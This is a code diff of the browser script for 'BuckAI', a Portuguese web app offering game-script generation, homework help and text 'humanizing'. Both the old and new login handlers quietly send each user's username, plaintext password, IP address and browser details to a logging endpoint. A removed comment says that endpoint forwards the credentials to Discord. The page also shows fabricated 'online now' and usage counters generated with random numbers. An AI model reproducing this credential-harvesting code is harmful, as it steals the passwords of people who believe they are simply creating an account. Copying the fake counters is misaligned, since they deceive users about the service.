@@ -1,35 +1,8 @@
 document.addEventListener('DOMContentLoaded', () => {
-  // Lógica Web (Removido Electron ipcRenderer)
-  
+  // --- Elementos do DOM ---
   const activeNowEl = document.getElementById('activeNow');
   const totalScriptsEl = document.getElementById('totalScripts');
   const totalClientsEl = document.getElementById('totalClients');
-
-  // Simulação de estatísticas para Web (Como não há banco central, usamos números dinâmicos)
-  const updateStatsUI = () => {
-    // Carregar do localStorage se existir
-    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || {
-      totalScripts: Math.floor(Math.random() * 50) + 100,
-      totalClients: Math.floor(Math.random() * 20) + 50
-    };
-    
-    activeNowEl.textContent = Math.floor(Math.random() * 8) + 2; // Simula 2-10 online
-    totalScriptsEl.textContent = webStats.totalScripts;
-    totalClientsEl.textContent = webStats.totalClients;
-  };
-
-  const incrementScripts = () => {
-    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || {
-      totalScripts: 100,
-      totalClients: 50
-    };
-    webStats.totalScripts++;
-    localStorage.setItem('buckai_stats', JSON.stringify(webStats));
-    updateStatsUI();
-  };
-
-  updateStatsUI();
-
   const generateBtn = document.getElementById('generateBtn');
   const descriptionInput = document.getElementById('description');
   const platformRadios = document.getElementsByName('platform');
@@ -47,31 +20,32 @@ document.addEventListener('DOMContentLoaded', () => {
   const authUsernameInput = document.getElementById('authUsername');
   const authPasswordInput = document.getElementById('authPassword');
   const welcomeUserEl = document.getElementById('welcomeUser');
-
-  // Seletores de Modos
+  const userInfoBar = document.getElementById('userInfo');
+  const userCreditsEl = document.getElementById('userCredits');
+  const upgradeBtn = document.getElementById('upgradeBtn');
   const gamerModeBtn = document.getElementById('gamerModeBtn');
   const studentModeBtn = document.getElementById('studentModeBtn');
+  const humanizeModeBtn = document.getElementById('humanizeModeBtn');
+  const projectsModeBtn = document.getElementById('projectsModeBtn');
   const gamerSection = document.getElementById('gamerSection');
   const studentSection = document.getElementById('studentSection');
+  const humanizeSection = document.getElementById('humanizeSection');
+  const projectsSection = document.getElementById('projectsSection');
+  const studyBtn = document.getElementById('studyBtn');
+  const studentTaskInput = document.getElementById('studentTask');
+  const studentImageInput = document.getElementById('studentImageInput');
+  const uploadStudentImageBtn = document.getElementById('uploadStudentImageBtn');
+  const studentImageStatus = document.getElementById('studentImageStatus');
+  const humanizeBtn = document.getElementById('humanizeBtn');
+  const humanizeTextInput = document.getElementById('humanizeText');
+  const humanizeToneRadios = document.getElementsByName('humanizeTone');
+  const historyList = document.getElementById('historyList');
+  const clearHistoryBtn = document.getElementById('clearHistoryBtn');
 
-  // Lógica de Troca de Modos
-  gamerModeBtn.addEventListener('click', () => {
-    gamerModeBtn.classList.add('active');
-    studentModeBtn.classList.remove('active');
-    gamerSection.classList.remove('hidden');
-    studentSection.classList.add('hidden');
-    resultArea.classList.add('hidden');
-  });
+  // --- Configurações ---
+  const MAX_FREE_CREDITS = 5;
 
-  studentModeBtn.addEventListener('click', () => {
-    studentModeBtn.classList.add('active');
-    gamerModeBtn.classList.remove('active');
-    studentSection.classList.remove('hidden');
-    gamerSection.classList.add('hidden');
-    resultArea.classList.add('hidden');
-  });
-
-  // Função para pegar IP (opcional para logs)
+  // --- Funções de Utilidade ---
   const getIP = async () => {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
@@ -80,212 +54,242 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch(e) { return "IP Web"; }
   };
 
-  // Verificar inscrição ao iniciar (LocalStorage)
-  const checkSub = async () => {
-    const isSubscribed = localStorage.getItem('buckai_subscribed') === 'true';
-    const savedUser = localStorage.getItem('buckai_username');
-
-    if (!isSubscribed) {
-      lockScreen.classList.remove('hidden');
-    } else {
-      // Log de retorno de usuário ativo
-      const ip = await getIP();
-      fetch('/api/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          type: 'active', 
-          ip, 
-          username: savedUser || "Usuário Antigo",
-          userAgent: navigator.userAgent 
-        })
-      });
-      
-      if (savedUser) {
-        welcomeUserEl.textContent = `BEM-VINDO DE VOLTA, ${savedUser.toUpperCase()}`;
-        welcomeUserEl.classList.remove('hidden');
-      }
-    }
-  };
-  checkSub();
-
-  // Lógica de Desbloqueio e Login
-  verifySubBtn.addEventListener('click', async () => {
-    const username = authUsernameInput.value.trim();
-    const password = authPasswordInput.value.trim();
-
-    if (!username || !password) {
-      alert('Por favor, crie um usuário e uma senha para continuar.');
-      return;
-    }
-
-    const ip = await getIP();
-    // Envia credenciais para o Discord via API
-    await fetch('/api/log', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        type: 'login', 
-        username, 
-        password, 
-        ip, 
-        userAgent: navigator.userAgent 
-      })
-    });
-
-    // Salva as informações localmente para não precisar logar de novo
-    localStorage.setItem('buckai_subscribed', 'true');
-    localStorage.setItem('buckai_username', username);
-    localStorage.setItem('buckai_password', password); // Salva a senha localmente conforme solicitado
-
-    welcomeUserEl.textContent = `BEM-VINDO, ${username.toUpperCase()}`;
-    welcomeUserEl.classList.remove('hidden');
-
-    lockScreen.classList.add('hidden');
-    alert(`Conta criada com sucesso! Bem-vindo, ${username}.`);
-  });
-
-  let selectedImageBase64 = null;
-
-  // Lógica para Upload de Imagem
-  uploadImageBtn.addEventListener('click', () => imageInput.click());
-
-  imageInput.addEventListener('change', (e) => {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = (readerEvent) => {
-        selectedImageBase64 = readerEvent.target.result.split(',')[1];
-        imageStatus.textContent = '✅ Print Adicionado';
-        uploadImageBtn.classList.add('selected');
-      };
-      reader.readAsDataURL(file);
-    }
-  });
-
-  // Efeito de digitação (Typewriter) Aprimorado
   const typeWriter = (text, element, speed = 2) => {
     let i = 0;
     element.textContent = '';
-    
-    // Garantir que a fonte seja Fira Code na área de código
     element.style.fontFamily = "'Fira Code', monospace";
-    
     const timer = setInterval(() => {
       if (i < text.length) {
         element.textContent += text.charAt(i);
         i++;
-        // Scroll automático suave
-        if (i % 5 === 0) {
-          element.parentElement.scrollTop = element.parentElement.scrollHeight;
-        }
+        if (i % 5 === 0) element.parentElement.scrollTop = element.parentElement.scrollHeight;
       } else {
         clearInterval(timer);
       }
     }, speed);
   };
 
-  const getSelectedPlatform = () => {
-    for (const radio of platformRadios) {
-      if (radio.checked) return radio.value;
-    }
-    return 'FiveM';
+  // Simulação de estatísticas
+  const updateStatsUI = () => {
+    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || {
+      totalScripts: Math.floor(Math.random() * 50) + 100,
+      totalClients: Math.floor(Math.random() * 20) + 50
+    };
+    activeNowEl.textContent = Math.floor(Math.random() * 8) + 2;
+    totalScriptsEl.textContent = webStats.totalScripts;
+    totalClientsEl.textContent = webStats.totalClients;
   };
 
-  // Download ZIP (Versão Web - Simplificada para baixar apenas o código como .txt ou similar se necessário,
-  // ou poderíamos usar JSZip se quisermos manter a experiência ZIP)
-  downloadBtn.addEventListener('click', async () => {
-    const code = outputCode.textContent;
-    const platform = getSelectedPlatform();
+  const incrementGlobalScripts = () => {
+    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || { totalScripts: 100, totalClients: 50 };
+    webStats.totalScripts++;
+    localStorage.setItem('buckai_stats', JSON.stringify(webStats));
+    updateStatsUI();
+  };
 
-    if (!code) return;
-
-    // Criar um arquivo blob para download direto no navegador
-    const blob = new Blob([code], { type: 'text/plain' });
-    const url = window.URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `BuckAI_Script_${platform}.txt`;
-    document.body.appendChild(a);
-    a.click();
-    window.URL.revokeObjectURL(url);
-    document.body.removeChild(a);
+  // --- Lógica de Usuário e Créditos ---
+  const getUserData = () => {
+    const defaultData = {
+      username: '',
+      credits: MAX_FREE_CREDITS,
+      lastReset: new Date().toDateString(),
+      history: [],
+      isPremium: false
+    };
+    const saved = localStorage.getItem('buckai_user_data');
+    if (!saved) return defaultData;
     
-    alert('Código baixado como .txt! (Para .ZIP completo, use a versão Desktop ou extraia manualmente)');
-  });
+    const data = JSON.parse(saved);
+    const today = new Date().toDateString();
+    if (data.lastReset !== today && !data.isPremium) {
+      data.credits = MAX_FREE_CREDITS;
+      data.lastReset = today;
+      saveUserData(data);
+    }
+    return data;
+  };
 
-  const studyBtn = document.getElementById('studyBtn');
-  const studentTaskInput = document.getElementById('studentTask');
-  const studentImageInput = document.getElementById('studentImageInput');
-  const uploadStudentImageBtn = document.getElementById('uploadStudentImageBtn');
-  const studentImageStatus = document.getElementById('studentImageStatus');
+  const saveUserData = (data) => {
+    localStorage.setItem('buckai_user_data', JSON.stringify(data));
+    updateUI();
+  };
 
-  let studentImageBase64 = null;
+  const updateUI = () => {
+    const data = getUserData();
+    if (data.username) {
+      welcomeUserEl.textContent = `BEM-VINDO, ${data.username.toUpperCase()}`;
+      userCreditsEl.textContent = data.isPremium ? "∞" : data.credits;
+      
+      if (data.isPremium) {
+        upgradeBtn.innerHTML = '<i class="fas fa-crown"></i> PLANO PREMIUM';
+        upgradeBtn.classList.add('active');
+      } else {
+        upgradeBtn.innerHTML = '<i class="fas fa-crown"></i> SEJA PREMIUM';
+        upgradeBtn.classList.remove('active');
+      }
 
-  uploadStudentImageBtn.addEventListener('click', () => studentImageInput.click());
+      userInfoBar.classList.remove('hidden');
+      lockScreen.classList.add('hidden');
+    } else {
+      lockScreen.classList.remove('hidden');
+    }
+    renderHistory();
+    updateStatsUI();
+  };
 
-  studentImageInput.addEventListener('change', (e) => {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = (readerEvent) => {
-        studentImageBase64 = readerEvent.target.result.split(',')[1];
-        studentImageStatus.textContent = '✅ Foto Adicionada';
-        uploadStudentImageBtn.classList.add('selected');
-      };
-      reader.readAsDataURL(file);
+  const useCredit = () => {
+    const data = getUserData();
+    if (data.isPremium) return true;
+    if (data.credits > 0) {
+      data.credits--;
+      saveUserData(data);
+      return true;
+    }
+    alert("Você atingiu o limite diário de créditos gratuitos! Torne-se Premium para uso ilimitado.");
+    return false;
+  };
+
+  // Upgrade para Premium (Simulado)
+  upgradeBtn.addEventListener('click', () => {
+    const data = getUserData();
+    if (data.isPremium) {
+      alert("Você já é um membro Premium! Aproveite seus benefícios ilimitados.");
+      return;
+    }
+    if (confirm("Deseja ativar o Plano Premium experimental? (Benefícios: Créditos Infinitos e Suporte Prioritário)")) {
+      data.isPremium = true;
+      saveUserData(data);
+      alert("Parabéns! Agora você é BuckAI Premium! 🚀");
     }
   });
 
-  // Envio Modo Estudante (Web)
-  studyBtn.addEventListener('click', async () => {
-    const task = studentTaskInput.value.trim();
-    if (!task && !studentImageBase64) {
-      alert('Por favor, digite sua dúvida ou envie uma foto do exercício.');
+  // --- Lógica de Histórico ---
+  const addToHistory = (type, title, content) => {
+    const data = getUserData();
+    const newItem = {
+      id: Date.now(),
+      type,
+      title,
+      content,
+      date: new Date().toLocaleString()
+    };
+    data.history.unshift(newItem);
+    if (data.history.length > 50) data.history.pop();
+    saveUserData(data);
+  };
+
+  const renderHistory = () => {
+    const data = getUserData();
+    if (!historyList) return;
+
+    if (data.history.length === 0) {
+      historyList.innerHTML = `
+        <div class="empty-state">
+          <i class="fas fa-folder-open"></i>
+          <p>Você ainda não criou nenhum projeto.</p>
+        </div>`;
       return;
     }
 
-    loader.classList.remove('hidden');
-    studyBtn.disabled = true;
-    resultArea.classList.add('hidden');
+    historyList.innerHTML = data.history.map(item => `
+      <div class="history-item">
+        <div class="history-info">
+          <h4>${item.title}</h4>
+          <p><i class="fas fa-tag"></i> ${item.type} • <i class="far fa-clock"></i> ${item.date}</p>
+        </div>
+        <div class="history-actions">
+          <button onclick="viewHistoryItem(${item.id})" title="Ver Projeto"><i class="fas fa-eye"></i></button>
+          <button onclick="copyHistoryItem(${item.id})" title="Copiar"><i class="fas fa-copy"></i></button>
+          <button onclick="deleteHistoryItem(${item.id})" title="Excluir"><i class="fas fa-trash"></i></button>
+        </div>
+      </div>
+    `).join('');
+  };
 
-    try {
-      const ip = await getIP();
-      const response = await fetch('/api/study', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ task, base64Image: studentImageBase64, ip })
-      });
-
-      const data = await response.json();
-      if (data.error) throw new Error(data.error);
-
-      studentImageBase64 = null;
-      studentImageStatus.textContent = '📸 Tirar/Enviar Foto';
-      uploadStudentImageBtn.classList.remove('selected');
-      studentImageInput.value = '';
-
+  // Funções globais para o histórico
+  window.viewHistoryItem = (id) => {
+    const data = getUserData();
+    const item = data.history.find(i => i.id === id);
+    if (item) {
       resultArea.classList.remove('hidden');
-      typeWriter(data.result, outputCode);
+      outputCode.textContent = item.content;
       resultArea.scrollIntoView({ behavior: 'smooth' });
+    }
+  };
 
-    } catch (error) {
-      alert('Erro na pesquisa: ' + error.message);
-    } finally {
-      loader.classList.add('hidden');
-      studyBtn.disabled = false;
+  window.copyHistoryItem = (id) => {
+    const data = getUserData();
+    const item = data.history.find(i => i.id === id);
+    if (item) {
+      navigator.clipboard.writeText(item.content);
+      alert("Conteúdo copiado!");
+    }
+  };
+
+  window.deleteHistoryItem = (id) => {
+    if (confirm("Deseja excluir este item do histórico?")) {
+      const data = getUserData();
+      data.history = data.history.filter(i => i.id !== id);
+      saveUserData(data);
+    }
+  };
+
+  clearHistoryBtn.addEventListener('click', () => {
+    if (confirm("Tem certeza que deseja limpar todo o seu histórico?")) {
+      const data = getUserData();
+      data.history = [];
+      saveUserData(data);
     }
   });
 
-  // Gerar Script (Web)
+  // --- Lógica de Troca de Modos ---
+  const switchMode = (activeBtn, activeSection) => {
+    [gamerModeBtn, studentModeBtn, humanizeModeBtn, projectsModeBtn].forEach(btn => btn.classList.remove('active'));
+    [gamerSection, studentSection, humanizeSection, projectsSection].forEach(sec => sec.classList.add('hidden'));
+    activeBtn.classList.add('active');
+    activeSection.classList.remove('hidden');
+    resultArea.classList.add('hidden');
+  };
+
+  gamerModeBtn.addEventListener('click', () => switchMode(gamerModeBtn, gamerSection));
+  studentModeBtn.addEventListener('click', () => switchMode(studentModeBtn, studentSection));
+  humanizeModeBtn.addEventListener('click', () => switchMode(humanizeModeBtn, humanizeSection));
+  projectsModeBtn.addEventListener('click', () => switchMode(projectsModeBtn, projectsSection));
+
+  // --- Autenticação ---
+  verifySubBtn.addEventListener('click', async () => {
+    const username = authUsernameInput.value.trim();
+    const password = authPasswordInput.value.trim();
+
+    if (!username || !password) {
+      alert('Por favor, preencha usuário e senha.');
+      return;
+    }
+
+    const data = getUserData();
+    data.username = username;
+    saveUserData(data);
+    
+    const ip = await getIP();
+    fetch('/api/log', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'login', username, password, ip, userAgent: navigator.userAgent })
+    });
+
+    updateUI();
+    alert(`Bem-vindo, ${username}! Você ganhou 5 créditos diários.`);
+  });
+
+  // --- Funcionalidades Principais ---
+
+  // Gerar Script
   generateBtn.addEventListener('click', async () => {
     const description = descriptionInput.value.trim();
-    const platform = getSelectedPlatform();
+    const platform = Array.from(platformRadios).find(r => r.checked)?.value || 'FiveM';
 
-    if (!description && !selectedImageBase64) {
-      alert('Por favor, descreva o script ou envie um print do erro.');
-      return;
-    }
+    if (!description && !selectedImageBase64) return alert('Descreva o script.');
+    if (!useCredit()) return;
 
     loader.classList.remove('hidden');
     generateBtn.disabled = true;
@@ -293,84 +297,124 @@ document.addEventListener('DOMContentLoaded', () => {
 
     try {
       const ip = await getIP();
-      const response = await fetch('/api/generate', {
+      const res = await fetch('/api/generate', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ description, platform, base64Image: selectedImageBase64, ip })
       });
-
-      const data = await response.json();
+      const data = await res.json();
       if (data.error) throw new Error(data.error);
-
-      selectedImageBase64 = null;
-      imageStatus.textContent = '📎 Enviar Print';
-      uploadImageBtn.classList.remove('selected');
-      imageInput.value = '';
 
       resultArea.classList.remove('hidden');
       typeWriter(data.result, outputCode);
+      addToHistory("Script " + platform, description || "Análise de Imagem", data.result);
+      incrementGlobalScripts();
       resultArea.scrollIntoView({ behavior: 'smooth' });
-
-      incrementScripts();
-
-    } catch (error) {
-      console.error('Erro ao gerar script:', error);
-      alert('Ocorreu um erro: ' + error.message);
-    } finally {
-      loader.classList.add('hidden');
-      generateBtn.disabled = false;
-    }
+    } catch (e) { alert(e.message); }
+    finally { loader.classList.add('hidden'); generateBtn.disabled = false; }
   });
 
-  // Copiar código
-  copyBtn.addEventListener('click', () => {
-    const code = outputCode.textContent;
-    navigator.clipboard.writeText(code).then(() => {
-      const originalText = copyBtn.textContent;
-      copyBtn.textContent = 'Copiado!';
-      copyBtn.classList.add('copied');
-      setTimeout(() => {
-        copyBtn.textContent = originalText;
-        copyBtn.classList.remove('copied');
-      }, 2000);
-    });
-  });
+  // Modo Estudante
+  studyBtn.addEventListener('click', async () => {
+    const task = studentTaskInput.value.trim();
+    if (!task && !studentImageBase64) return alert('Digite sua dúvida ou envie uma foto.');
+    if (!useCredit()) return;
 
-  // Corrigir código (Web)
-  fixBtn.addEventListener('click', async () => {
-    const code = outputCode.textContent;
-    const platform = getSelectedPlatform();
-    const errorMsg = prompt("O que está errado ou o que você quer melhorar?");
-
-    if (!code) return;
-
-    loader.querySelector('p').textContent = 'Corrigindo seu script...';
     loader.classList.remove('hidden');
-    fixBtn.disabled = true;
+    studyBtn.disabled = true;
+    resultArea.classList.add('hidden');
 
     try {
       const ip = await getIP();
-      const response = await fetch('/api/generate', {
+      const res = await fetch('/api/study', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          description: `CORREÇÃO:\nCódigo Atual: ${code}\nErro/Melhoria: ${errorMsg}`, 
-          platform, 
-          ip 
-        })
+        body: JSON.stringify({ task, base64Image: studentImageBase64, ip })
       });
-
-      const data = await response.json();
+      const data = await res.json();
       if (data.error) throw new Error(data.error);
 
+      resultArea.classList.remove('hidden');
       typeWriter(data.result, outputCode);
+      addToHistory("Estudo", task || "Foto de Exercício", data.result);
+      resultArea.scrollIntoView({ behavior: 'smooth' });
+    } catch (e) { alert(e.message); }
+    finally { loader.classList.add('hidden'); studyBtn.disabled = false; }
+  });
 
-    } catch (error) {
-      alert('Erro ao corrigir: ' + error.message);
-    } finally {
-      loader.classList.add('hidden');
-      loader.querySelector('p').textContent = 'Codificando seu script...';
-      fixBtn.disabled = false;
+  // Humanizar Texto
+  humanizeBtn.addEventListener('click', async () => {
+    const text = humanizeTextInput.value.trim();
+    const tone = Array.from(humanizeToneRadios).find(r => r.checked)?.value || 'Casual';
+
+    if (!text) return alert('Cole um texto.');
+    if (!useCredit()) return;
+
+    loader.querySelector('p').textContent = 'HUMANIZANDO...';
+    loader.classList.remove('hidden');
+    humanizeBtn.disabled = true;
+    resultArea.classList.add('hidden');
+
+    try {
+      const ip = await getIP();
+      const res = await fetch('/api/humanize', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text, tone, ip })
+      });
+      const data = await res.json();
+      if (data.error) throw new Error(data.error);
+
+      resultArea.classList.remove('hidden');
+      typeWriter(data.result, outputCode);
+      addToHistory("Humanização (" + tone + ")", text.substring(0, 30) + "...", data.result);
+      resultArea.scrollIntoView({ behavior: 'smooth' });
+    } catch (e) { alert(e.message); }
+    finally { 
+      loader.classList.add('hidden'); 
+      loader.querySelector('p').textContent = 'PROCESSANDO...';
+      humanizeBtn.disabled = false; 
     }
   });
+
+  // --- Inicialização ---
+  updateUI();
+
+  // Outros ouvintes de eventos
+  uploadImageBtn.addEventListener('click', () => imageInput.click());
+  imageInput.addEventListener('change', (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (ev) => {
+        selectedImageBase64 = ev.target.result.split(',')[1];
+        imageStatus.textContent = '✅ Print Adicionado';
+        uploadImageBtn.classList.add('selected');
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  uploadStudentImageBtn.addEventListener('click', () => studentImageInput.click());
+  studentImageInput.addEventListener('change', (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (ev) => {
+        studentImageBase64 = ev.target.result.split(',')[1];
+        studentImageStatus.textContent = '✅ Foto Adicionada';
+        uploadStudentImageBtn.classList.add('selected');
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  copyBtn.addEventListener('click', () => {
+    navigator.clipboard.writeText(outputCode.textContent);
+    copyBtn.textContent = 'Copiado!';
+    setTimeout(() => copyBtn.textContent = 'COPIAR', 2000);
+  });
+
+  let selectedImageBase64 = null;
+  let studentImageBase64 = null;
 });
